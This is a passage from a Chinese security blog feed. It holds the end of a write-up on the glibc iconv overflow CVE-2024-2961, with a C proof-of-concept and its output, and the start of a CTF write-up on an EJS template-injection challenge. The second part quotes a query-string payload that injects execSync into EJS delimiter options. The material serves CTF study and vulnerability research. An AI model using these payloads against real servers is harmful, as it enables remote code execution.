<span class="token operator">*</span>escseq<span class="token punctuation">;</span>        <span class="token comment">// &lt;-------------------- NO BOUND CHECK</span>        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>used <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>used <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        escseq <span class="token operator">=</span> <span class="token string">"+I+J+K+L+M"</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>used <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> ESC<span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">*</span>outptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>escseq<span class="token operator">++</span><span class="token punctuation">;</span>        ann <span class="token operator">=</span> <span class="token punctuation">(</span>ann <span class="token operator">&amp;</span> <span class="token operator">~</span>SS3_ann<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>used <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个块向<code>outbuf</code>（由<code>outptr</code>指向）写入不同的转义序列。</p><p>在第一个if<code>[1]</code>里，前面有一个额外的<code>if()</code>块来检查输出缓冲区是否足够大以容纳四个字符。而其他两个if()<code>[2][3]</code>则没有这个检查。因此，转义序列可能会越界写入。</p><p>利用如： <code>劄</code> 、 <code>䂚</code> 或 <code>峛</code>、<code>湿</code>这种字符，在<code>iconv()</code>转义时会导致1到3字节的溢出：</p><pre class="line-numbers language-none"><code class="language-none">$*H [24 2A 48]$+I [24 2B 49]$+J [24 2B 4A]$+K [24 2B 4B]$+L [24 2B 4C]$+M [24 2B 4D]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证这个溢出问题的poc：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*$ gcc -o poc ./poc.c &amp;&amp; ./poc*/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">void</span> <span class="token function">hexdump</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> buflen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">iconv_t</span> cd <span class="token operator">=</span> <span class="token function">iconv_open</span><span class="token punctuation">(</span><span class="token string">"ISO-2022-CN-EXT"</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> input<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAAAA劄"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> output<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pinput <span class="token operator">=</span> input<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>poutput <span class="token operator">=</span> output<span class="token punctuation">;</span>    <span class="token comment">// Same size for input and output buffer: 8 bytes</span>    <span class="token class-name">size_t</span> sinput <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> soutput <span class="token operator">=</span> sinput<span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pinput<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sinput<span class="token punctuation">,</span> <span class="token operator">&amp;</span>poutput<span class="token punctuation">,</span> <span class="token operator">&amp;</span>soutput<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Remaining bytes (should be > 0): %zd\n"</span><span class="token punctuation">,</span> soutput<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hexdump</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gcc <span class="token parameter variable">-o</span> poc ./poc.c <span class="token operator">&amp;&amp;</span> ./pocRemaining bytes <span class="token punctuation">(</span>should be <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>: <span class="token parameter variable">-1</span>000000: <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> 1b <span class="token number">24</span> 2a  <span class="token number">48</span> 00 00 00  00 00 00 00    AAAA A.<span class="token variable">$*</span> H<span class="token punctuation">..</span>. <span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尽管告诉iconv()最多只能写入8字节，但实际上已写入了9字节（多出了最后的0x48）</p><p>既然能实现缓冲区溢出，那就有rce的机会</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复现环境：&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/&quot;&gt;https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://xz.aliyun.com/t/14690&quot;&gt;https://xz.aliyun.com/t/14690&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先挂起，必可活用于某次ctf（（&lt;/p&gt;
&lt;p&gt;2024.7.6：于ctfshow XGCTF 和 春秋杯夏季赛 中出现了相关题目&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="RCE" scheme="http://c1oudfl0w0.github.io/blog/tags/RCE/"/>
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="文件包含" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>2024数字中国决赛 复现</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-23T05:00:12.000Z</published>
    <updated>2024-06-27T10:13:40.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我连线下赛都没进，但是后辈们进了，于是叫他们带了附件回来，因为有AWDP还是值得一看的</p><span id="more"></span><h1 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h1><p>这个不急着复现</p><hr><h1 id="AWDP部分"><a href="#AWDP部分" class="headerlink" title="AWDP部分"></a>AWDP部分</h1><h1 id="aka-ssti"><a href="#aka-ssti" class="headerlink" title="aka_ssti"></a>aka_ssti</h1><blockquote><p>ejs ssti</p></blockquote><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/1716360844030.jpg" alt="1716360844030"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> mongoose <span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mongoose'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home?page=Home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  err<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token number">404</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">status</span><span class="token operator">:</span>err<span class="token punctuation">.</span>status<span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span>err<span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address<span class="token punctuation">;</span>    <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listening on http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json，这里只取关键的packages</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"packages"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token property">""</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>    <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>      <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.8"</span><span class="token punctuation">,</span>      <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>      <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>      <span class="token property">"fs"</span><span class="token operator">:</span> <span class="token string">"^0.0.1-security"</span><span class="token punctuation">,</span>      <span class="token property">"lodash"</span><span class="token operator">:</span> <span class="token string">"^4.17.4"</span><span class="token punctuation">,</span>      <span class="token property">"mongoose"</span><span class="token operator">:</span> <span class="token string">"^5.13.6"</span><span class="token punctuation">,</span>      <span class="token property">"randomatic"</span><span class="token operator">:</span> <span class="token string">"^3.1.1"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在开始审计，这里看似require了一堆库，实际有用到的只有express、path和ejs</p><p><code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>设置了渲染引擎为ejs</p><p>然后就是三个路由</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home?page=Home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'about'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;home 和 &#x2F;about 都是直接渲染模板，除此之外没有多余的操作了</p><p>结合题目名字，应该就是在ssti上面下文章</p><h3 id="CVE-2022-29078及其延伸出的issue（Failed）"><a href="#CVE-2022-29078及其延伸出的issue（Failed）" class="headerlink" title="CVE-2022-29078及其延伸出的issue（Failed）"></a>CVE-2022-29078及其延伸出的issue（Failed）</h3><p>搜一下ejs的ssti，有<a href="https://xz.aliyun.com/t/12323">CVE-2022-29078</a>，但是ejs版本 ≤ 3.1.6，我们的ejs版本是3.1.8，明显用不了</p><p>再找一找有<a href="https://github.com/mde/ejs/issues/720">https://github.com/mde/ejs/issues/720</a>，版本限制ejs ≤ 3.1.9，可以尝试利用</p><p>观察poc：</p><p><strong>page.ejs</strong></p><pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs">%%1");process.mainModule.require('child_process').execSync('calc');//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3000</span><span class="token operator">/</span>page<span class="token operator">?</span>settings<span class="token punctuation">[</span>view<span class="token operator">%</span>20options<span class="token punctuation">]</span><span class="token punctuation">[</span>closeDelimiter<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span><span class="token operator">%</span>3bprocess<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token operator">%</span>3b<span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而我们的ejs文件如下</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240523162203795.png" alt="image-20240523162203795"></p><p>直接打payload发现不可行，看来需要ejs文件那边对应上</p><p>总之先调试一下poc看看原因</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240529012646709.png" alt="image-20240529012646709"></p><p>发现我们需要进入这里的<code>d + d + c</code>分支才能执行命令，但是这里的line值为 html注释段到title标签前</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--A Design by W3layouts\nAuthor: W3layout\nAuthor URL: http://w3layouts.com\nLicense: Creative Commons Attribution 3.0 Unported\nLicense URL: http://creativecommons.org/licenses/by/3.0/\n--></span>\n<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中c对应的是<code>settings[view options][closeDelimiter]</code>，而d对应的是<code>settings[view options][delimiter]</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> d <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>opts<span class="token punctuation">.</span>delimiter<span class="token punctuation">;</span><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>opts<span class="token punctuation">.</span>openDelimiter<span class="token punctuation">;</span><span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>opts<span class="token punctuation">.</span>closeDelimiter<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这几个opts的参数代表着ejs渲染的标签，默认的渲染是<code>&lt;%</code>，即对应这里的<code>o</code>和<code>d</code>，那么<code>&gt;</code>对应的就是<code>c</code>，这样一来关系就很明确了</p><p>这个issue的原理就是通过修改渲染标签的方式来注入rce代码，但是这里的话我们可控的只有被渲染的变量 page ，对应的ejs模板里又没有别的利用点，所以不可用</p><hr><h3 id="寻找其它options对象实现rce"><a href="#寻找其它options对象实现rce" class="headerlink" title="寻找其它options对象实现rce"></a>寻找其它options对象实现rce</h3><p>在前面的研究过程中，发现我们可以传入某些特定的参数直接对一些配置的属性值进行修改，如<code>settings[view options][outputFunctionName]</code>和<code>settings[view options][closeDelimiter]</code>这样子的</p><p>继续一路找找相关的知识点，发现hxpCTF2022有个题也是类似这样的，那题有多种解法，其中就有适合我们的</p><p>参考：<a href="http://blog.z3ratu1.top/hxpCTF2022wp.html">http://blog.z3ratu1.top/hxpCTF2022wp.html</a></p><p>在前面研究CVE-2022-29078的时候，发现在ejs3.1.6后，几个来自opts的值，比如<code>outputFunctionName</code>，<code>localsName</code>，<code>destructuredLocals</code>都被过了一个<code>_JS_IDENTIFIER.test()</code>进行正则判断，控制了也不能用</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240627165830287.png" alt="image-20240627165830287"></p><p>我们回去看一下那个cve实现rce的点，在<code>ejs.js</code>的renderFile函数中：</p><p><img src="/blog/2024/05/23/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%86%B3%E8%B5%9B-%E5%A4%8D%E7%8E%B0/image-20240627171557437.png" alt="image-20240627171557437"></p><p>此处的opts后续会作为后续渲染的opts，而data即为render时传入的<code>query</code>对象，如前面cve的payload一样，data中settings属性的<code>view options</code>属性会被完整的传递给opts，那么我们需要控制的就是这里render函数的options对象</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">options<span class="token punctuation">.</span>client <span class="token operator">=</span> opts<span class="token punctuation">.</span>client <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>escapeFunction <span class="token operator">=</span> opts<span class="token punctuation">.</span>escape <span class="token operator">||</span> opts<span class="token punctuation">.</span>escapeFunction <span class="token operator">||</span> utils<span class="token punctuation">.</span>escapeXML<span class="token punctuation">;</span>options<span class="token punctuation">.</span>compileDebug <span class="token operator">=</span> opts<span class="token punctuation">.</span>compileDebug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">;</span>options<span class="token punctuation">.</span>filename <span class="token operator">=</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>options<span class="token punctuation">.</span>openDelimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>openDelimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>openDelimiter <span class="token operator">||</span> _DEFAULT_OPEN_DELIMITER<span class="token punctuation">;</span>options<span class="token punctuation">.</span>closeDelimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>closeDelimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>closeDelimiter <span class="token operator">||</span> _DEFAULT_CLOSE_DELIMITER<span class="token punctuation">;</span>options<span class="token punctuation">.</span>delimiter <span class="token operator">=</span> opts<span class="token punctuation">.</span>delimiter <span class="token operator">||</span> exports<span class="token punctuation">.</span>delimiter <span class="token operator">||</span> _DEFAULT_DELIMITER<span class="token punctuation">;</span>options<span class="token punctuation">.</span>strict <span class="token operator">=</span> opts<span class="token punctuation">.</span>strict <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">;</span>options<span class="token punctuation">.</span>context <span class="token operator">=</span> opts<span class="token punctuation">.</span>context<span class="token punctuation">;</span>options<span class="token 